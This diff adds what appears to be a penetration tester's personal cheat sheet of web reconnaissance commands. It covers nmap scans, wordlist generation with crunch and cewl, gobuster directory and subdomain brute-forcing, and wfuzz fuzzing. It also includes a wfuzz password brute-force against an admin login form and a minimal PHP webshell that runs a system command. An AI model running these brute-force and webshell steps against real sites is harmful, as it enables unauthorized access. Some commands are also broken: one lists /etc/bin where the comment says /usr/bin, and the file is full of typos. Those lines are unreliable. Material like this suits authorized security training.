@@ -1,0 +1,73 @@
+#nmap scan
+nmap -p 80,443 target
+nmap -sV -p 80,443 target 
+#run the script scan againts the target
+
+cd /usr/share/nmap/scripts
+ls -la | grep http
+
+nmap --script=http-enum -p 80,443 target
+
+
+#wordlist 
+apt-get update
+apt-get install seclists
+
+cd /usr/share/seclists/
+
+#genrate wordlist 
+
+crunch 2 4 abwaddefaesf12312e12e>wordlist.txt
+
+#create custom wordlist
+
+cewl -d 2 -m 4 -w customwordlist.txt site.com
+
+#create custom disctionary for rce from /usr/bin
+
+ls /etc/bin/ >binaries-wordlist.txt
+
+#finding directory using gobuster
+
+gobuster dir -u site.com -w wordlist.txt -t 5
+
+
+#finding subdomain
+
+gobuster dns -d megacorpone.com -w /usr/share/seclists/discovery/DNS/subdomains-top1million-110000.txt
+
+#discovery files and folder using wfuzz
+
+discovery files
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt https://site.com/FUZZ
+
+
+discovery directories
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 https://site.com/FUZZ/
+
+--hc is used to exclude the status code
+
+#fuzz a post data
+
+
+wfuzz -c -z file,/usr/share/seclists/Discovery/passwords.txt -d "login=admin&password=FUZZ" --hc 404 https://site.com/
+
+remove response header size
+
+--hh 6059
+
+#finding urls from wayback machine 
+
+cat urls.txt |hakrawler
+
+# php webshells
+
+<?php
+passthru("id");
+?>
+
+
+
+
+
+
